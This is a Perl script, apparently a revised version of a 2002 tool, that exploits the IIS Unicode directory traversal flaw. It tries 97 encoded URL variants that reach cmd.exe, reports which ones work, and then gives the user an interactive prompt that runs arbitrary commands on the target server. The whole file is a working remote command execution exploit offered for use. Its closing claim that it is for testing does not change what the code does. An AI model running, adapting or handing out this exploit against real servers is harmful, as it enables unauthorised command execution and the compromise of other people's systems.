#!/usr/bin/perl -w
#
# IIS Scan 2002 By Thomas O'Connor edited version of Unicode Shell By B-Root.
#
# Rewrite COPYWRITE AUTHOR ArkAngeL43 -> 2022
# special thanks to a special someone USR DOESNT SEEM TO EXIST BUT FUCK ITTTT 0-> BRROOT
use strict;
use IO::Socket;


# public vbariable
my $host;		# Host being probed.
my $port;		# Webserver port.
my $command;		# Command to issue.
my $url;		# URL being used.
my @results;		# Results from server.
my $probe;		# Whether to display output.
my @U;			# Unicode URLS. 

# URLS - Feel free to add here I did ;) tom.
# $U[0] always used for custom URL.
$U[1] = "/scripts/..%c0%af../winnt/system32/cmd.exe?/c+";
$U[2] = "/scripts..%c1%9c../winnt/system32/cmd.exe?/c+";
$U[3] = "/scripts/..%c1%pc../winnt/system32/cmd.exe?/c+";
$U[4] = "/scripts/..%c0%9v../winnt/system32/cmd.exe?/c+";
$U[5] = "/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+";
$U[6] = "/scripts/..%c1%8s../winnt/system32/cmd.exe?/c+";
$U[7] = "/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+";
$U[8] = "/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+";
$U[9] = "/scripts/..%c1%af../winnt/system32/cmd.exe?/c+";
$U[10] = "/scripts/..%e0%80%af../winnt/system32/cmd.exe?/c+";
$U[11] = "/scripts/..%f0%80%80%af../winnt/system32/cmd.exe?/c+";
$U[12] = "/scripts/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+";
$U[13] = "/scripts/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+";
$U[14] = "/msadc/..\%e0\%80\%af../..\%e0\%80\%af../..\%e0\%80\%af../winnt/system32/cmd.exe\?/c\+";
$U[15] = "/cgi-bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+";
$U[16] = "/samples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+";
$U[17] = "/iisadmpwd/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+";
$U[18] = "/_vti_cnf/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+";
$U[19] = "/_vti_bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+";
$U[20] = "/adsamples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+";
$U[21] = "/MSADC/root.exe?/c+dir";
$U[22] = "/PBServer/..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+dir";
$U[23] = "/PBServer/..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+dir";
$U[24] = "/PBServer/..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+dir";
$U[25] = "/PBServer/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir";
$U[26] = "/Rpc/..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+dir";
$U[27] = "/Rpc/..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+dir";
$U[28] = "/Rpc/..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+dir";
$U[29] = "/Rpc/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir";
$U[30] = "/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";
$U[31] = "/_vti_bin/..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63../winnt/system32/cmd.exe?/c+dir";
$U[32] = "/_vti_bin/..%%35c..%%35c..%%35c..%%35c..%%35c../winnt/system32/cmd.exe?/c+dir";
$U[33] = "/_vti_bin/..%25%35%63..%25%35%63..%25%35%63..%25%35%63..%25%35%63../winnt/system32/cmd.exe?/c+dir";
$U[34] = "/_vti_bin/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+dir";
$U[35] = "/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";
$U[36] = "/_vti_bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir";
$U[37] = "/_vti_bin/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir";
$U[38] = "/_vti_cnf/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir";
$U[39] = "/_vti_cnf/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir";
$U[40] = "/adsamples/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir";
$U[41] = "/adsamples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir";
$U[42] = "/c/winnt/system32/cmd.exe?/c+dir";
$U[43] = "/cgi-bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir";
$U[44] = "/cgi-bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir";
$U[45] = "/d/winnt/system32/cmd.exe?/c+dir";
$U[46] = "/iisadmpwd/..%252f..%252f..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+dir";
$U[47] = "/iisadmpwd/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir";
$U[48] = "/msaDC/..%%35%63..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+dir";
$U[49] = "/msaDC/..%%35c..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+dir";
$U[50] = "/msaDC/..%25%35%63..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+dir";
$U[51] = "/msaDC/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir";
$U[52] = "/msadc/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir";
$U[53] = "/msadc/..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+dir";
$U[54] = "/msadc/..%25%35%63..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+dir";
$U[55] = "/msadc/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+dir";
$U[56] = "/msadc/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir";
$U[57] = "/msadc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";
$U[58] = "/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir";
$U[59] = "/msadc/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir";
$U[60] = "/msadc/..%c1%af../winnt/system32/cmd.exe?/c+dir";
$U[61] = "/msadc/..%c1%pc../..%c1%pc../..%c1%pc../winnt/system32/cmd.exe?/c+dir";
$U[62] = "/msadc/..%c1%pc../winnt/system32/cmd.exe?/c+dir";
$U[63] = "/msadc/..%e0%80%af../..%e0%80%af../..%e0%80%af../winnt/system32/cmd.exe?/c+dir";
$U[64] = "/msadc/..%e0%80%af../winnt/system32/cmd.exe?/c+dir";
$U[65] = "/msadc/..%f0%80%80%af../..%f0%80%80%af../..%f0%80%80%af../winnt/system32/cmd.exe?/c+dir";
$U[66] = "/msadc/..%f0%80%80%af../winnt/system32/cmd.exe?/c+dir";
$U[67] = "/msadc/..%f8%80%80%80%af../..%f8%80%80%80%af../..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+dir";
$U[68] = "/msadc/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+dir";
$U[69] = "/msadc/..\ HTTP/1.1%e0\ HTTP/1.1%80\ HTTP/1.1%af../..\ HTTP/1.1%e0\ HTTP/1.1%80\ HTTP/1.1%af../..\ HTTP/1.1%e0\HTTP/1.1%80\ HTTP/1.1%af../winnt/system32/cmd.exe\ HTTP/1.1?/c\ HTTP/1.1+dir";
$U[70] = "/samples/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir";
$U[71] = "/samples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir";
$U[72] = "/scripts..%c1%9c../winnt/system32/cmd.exe?/c+dir";
$U[73] = "/scripts/.%252e/.%252e/winnt/system32/cmd.exe?/c+dir";
$U[74] = "/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir";
$U[75] = "/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir";
$U[76] = "/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir";
$U[77] = "/scripts/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+dir";
$U[78] = "/scripts/..%252f../winnt/system32/cmd.exe?/c+dir";
$U[79] = "/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir";
$U[80] = "/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir";
$U[81] = "/scripts/..%255c../winnt/system32/cmd.exe?/c+dir";
$U[82] = "/scripts/..%C0%AF..%C0%AF..%C0%AF..%C0%AFwinnt/system32/cmd.exe?/c+dir";
$U[83] = "/scripts/..%C1%1C..%C1%1C..%C1%1C..%C1%1Cwinnt/system32/cmd.exe?/c+dir";
$U[84] = "/scripts/..%C1%9C..%C1%9C..%C1%9C..%C1%9Cwinnt/system32/cmd.exe?/c+dir";
$U[85] = "/scripts/..%c0%9v../winnt/system32/cmd.exe?/c+dir";
$U[86] = "/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir";
$U[87] = "/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+dir";
$U[88] = "/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir";
$U[89] = "/scripts/..%c1%8s../winnt/system32/cmd.exe?/c+dir";
$U[90] = "/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir";
$U[91] = "/scripts/..%c1%af../winnt/system32/cmd.exe?/c+dir";
$U[92] = "/scripts/..%c1%pc../winnt/system32/cmd.exe?/c+dir";
$U[93] = "/scripts/..%e0%80%af../winnt/system32/cmd.exe?/c+dir";
$U[94] = "/scripts/..%f0%80%80%af../winnt/system32/cmd.exe?/c+dir";
$U[95] = "/scripts/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+dir";
$U[96] = "/scripts/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+dir";
$U[97] = "/scripts/root.exe?/c+dir/msadc/..%fc%80%80%80%80%af../..%fc%80%80%80%80%af../..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+dir";

&intro;
&scan;
&choose;
&command;
&exit; # Play safe with this .

sub intro {
	&help;
	&host;
	&server;
};

# host subroutine.
sub host {
	print "\nHost : ";
	$host=<STDIN>;
	chomp $host;
	if ($host eq ""){$host="localhost"};
	print "\nPort : ";
	$port=<STDIN>;
	chomp $port;
	if ($port =~/\D/ ){$port="80"};
	if ($port eq "" ) {$port = "80"};
};	# end host subroutine.

# Server string subroutine.
sub server {
	my $X;
	print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
	print "\nChecking if the server is IIS ...";
	$probe = "string";
	my $output;
	my $webserver = "something";
	&connect;
	for ($X=0; $X<=10; $X++){
		$output = $results[$X];
		if (defined $output){
		if ($output =~/IIS/){ $webserver = "iis" };
		};
};
if ($webserver ne "iis"){
print "\a\a\n\nWARNING : I DONT THINK THE SERVER IS IIS.";		
print "\nThis Server may not be running Micro\$oft IIS WebServer";
print "\nand therefore may not be exploitable using the"; 
print "\nUnicode Bug.";
print "\n\n\nDo You Wish To Cont ... [Y/N]";
my $choice = <STDIN>;
chomp $choice;
if ($choice =~/N/i) {&exit};
            }else{
print "\n\nOK ... It Seems To Be IIS.";
	};		
};  # end server subroutine.

# scan subroutine.
sub scan {
my $status = "not_vulnerable";
print "\nScanning Webserver $host on port $port ...";
my $loop;
my $output;
my $flag;
$command="dir";
for ($loop=1; $loop < @U; $loop++) { 
$flag = "0";
$url = $U[$loop];
$probe = "scan";
&connect;
foreach $output (@results){
if ($output =~ /Directory/) {
                              $flag = "1";
			      $status = "vulnerable";
			      };
	};

if ($flag eq "0") { 
print "\n$host is not vulnerable to Unicode URL Number $loop.";
}else{
print "\a\a\a\n$host IS VULNERABLE TO UNICODE URL NUMBER $loop !!!";
     };
};
if ($status eq "not_vulnerable"){
				print "\n\nSORRY $host is NOT Vulnerable to the UNICODE Exploit.";
				&exit;
				};
}; # end scan subroutine.

# choose URL subroutine.
sub choose {
print "\nURL To Use [0 = Other]: ";
my $choice=<STDIN>;
chomp $choice;
if ($choice > @U){ &choose };
if ($choice =~/\D/g ){ &choose };
if ($choice == 0){ &other };
$url = $U[$choice];
print "\nURL: HTTP://$host$url"; 
}; # end choose URL subroutine.

# Other URL subroutine.
sub other {
print "\nURL [minus command] eg: HTTP://$host\/scripts\/cmd.exe?\/+"; 
print "\nHTTP://$host";
my $other = <STDIN>;
chomp $other;
$U[0] = $other;
};  # end other subroutine.

# Command subroutine.
sub command {
while ($command !~/quit/i) {
print "\nHELP QUIT URL SCAN Or Command eg dir C: ";
print "\nCommand :";
$command = <STDIN>;
chomp $command;
if ($command =~/quit/i) { &exit };
if ($command =~/url/i) { &choose }; 
if ($command =~/scan/i) { &scan };
if ($command =~/help/i) { &help };
$command =~ s/\s/+/g; # remove white space.
print "HTTP://$host$url$command";
$probe = "command";
if ($command !~/quit|url|scan|help/) {&connect};
};
&exit;
};  # end command subroutine.

# Connect subroutine.
sub connect {
my $connection = IO::Socket::INET->new (
				Proto => "tcp",
				PeerAddr => "$host",
				PeerPort => "$port",
				) or die "\nSorry UNABLE TO CONNECT To $host On Port $port.\n";
$connection -> autoflush(1);
if ($probe =~/command|scan/){
print $connection "GET $url$command HTTP/1.0\r\n\r\n";
}elsif ($probe =~/string/) {
print $connection "HEAD / HTTP/1.0\r\n\r\n";
};

while ( <$connection> ) { 
			@results = <$connection>;
			 };
close $connection;
if ($probe eq "command"){ &output };
if ($probe eq "string"){ &output };
};  # end connect subroutine.

# output subroutine.
sub output{
print "\nOUTPUT FROM $host. \n\n";
my $display;
# if probe is a for server string display only first 10 lines.
if ($probe eq "string") {
			my $X;
			for ($X=0; $X<=10; $X++) {
			$display = $results[$X];
			if (defined $display){print "$display";};
			sleep 1;
				};
# else print all server output to the screen.
			}else{
			foreach $display (@results){
			    print "$display";
			    sleep 1;
				};
                          };
};  # end output subroutine.

# exit subroutine.
sub exit{
print "\n\n\nYou should be happy i made this for testing so your server is secure#.";
print "\nCya!";
print "\n\n\n";
exit;
};

# Help subroutine.
sub help {
print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
print "\n IIS Scan 2002 by Thomas O'Connor.";
print "\n www.thomasoconnor.net";
print "\n ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
print "\n A Unicode HTTP exploit for IIS WebServers.";
print "\n";
print "\n First checks if the server is IIS.";
print "\n Scans for usable Unicode URL in 97 different ways.";
print "\n Then allows choice of which URL to use including an URL of";
print "\n your own design eg. After copying cmd.exe to /scripts.";
print "\n Commands are executed via your choice of URL on the target";
print "\n server.";
print "\n ";
print "\n URL can be changed at anytime by typing URL."; 
print "\n The Webserver can be re-SCANed at anytime by typing SCAN.";
print "\n Program can be QUIT at anytime by typing QUIT.";
print "\n HELP prints this ... ";
print "\n Have Fun Tom ( Vline of irc.dal.net #theboxnetwork ). !";
print "\n\n\n";
}; # end help subroutine.



